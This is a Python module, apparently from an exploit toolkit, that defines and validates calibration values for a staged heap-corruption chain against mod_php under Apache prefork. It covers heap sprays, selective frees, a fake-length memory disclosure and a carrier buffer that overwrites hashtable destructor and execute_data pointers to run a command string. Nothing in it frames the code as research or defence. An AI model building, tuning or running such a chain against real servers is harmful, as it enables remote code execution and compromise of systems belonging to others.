"""Calibration model for the pinned mod_php chain."""

from __future__ import annotations

from dataclasses import dataclass

from .schema import (
    A1Profile,
    A2Profile,
    AbiLayout,
    AllocatorLayout,
    B1Profile,
    B1ReleasePlan,
    B2Profile,
    HeapOffsets,
    SymbolOffsets,
)


CHAIN_ID = "modphp-pinned-v1"
SCHEDULER_ID = "apache-prefork-n-minus-one/v1"


@dataclass(frozen=True)
class ModPhpPinnedCalibration:
    """Only values consumed by the A1/B1/A2/B2 state machine."""

    abi: AbiLayout
    allocator: AllocatorLayout
    symbols: SymbolOffsets
    heap: HeapOffsets
    a1: A1Profile
    b1: B1Profile
    a2: A2Profile
    b2: B2Profile

    def validate(self) -> None:
        if self.abi.byte_order not in ("little", "big"):
            raise ValueError("unsupported byte order")
        if self.abi.pointer_size not in (4, 8):
            raise ValueError("unsupported pointer size")
        alignment = self.allocator.chunk_alignment
        if alignment <= 0 or alignment & (alignment - 1):
            raise ValueError("chunk alignment must be a power of two")
        if not self.b1.page_spec:
            raise ValueError("B1 page specification is empty")
        release = self.b1.release_sprays
        if isinstance(release, B1ReleasePlan):
            if (
                len(release.spray_indices) != len(set(release.spray_indices))
                or any(index < 0 or index >= self.b1.sprays for index in release.spray_indices)
            ):
                raise ValueError("invalid B1 selective release index")
            if any(pages < 1 for pages in release.post_release_pages):
                raise ValueError("invalid B1 post-release allocation")
        if self.b1.fake_length <= len(self.b1.marker):
            raise ValueError("B1 disclosure is shorter than its marker")
        if self.a1.depth < 1 or self.a2.depth < 1:
            raise ValueError("multipart depth must be positive")
        command_capacity = (
            self.b2.value_length
            - self.abi.command_string_offset
            - self.abi.string_data_offset
            - 1
        )
        if command_capacity < 1:
            raise ValueError("B2 carrier has no command capacity")
        pointer_fields = (
            self.abi.hashtable_data_offset,
            self.abi.hashtable_next_free_offset,
            self.abi.hashtable_destructor_offset,
            self.abi.execute_data_offset + self.abi.execute_argument_offset,
            self.abi.command_string_offset + self.abi.string_hash_offset,
            self.abi.command_string_offset + self.abi.string_length_offset,
        )
        if any(
            offset < 0 or offset + self.abi.pointer_size > self.b2.value_length
            for offset in pointer_fields
        ):
            raise ValueError("ABI pointer field exceeds B2 carrier")
__all__ = (
    "CHAIN_ID",
    "SCHEDULER_ID",
    "ModPhpPinnedCalibration",
)
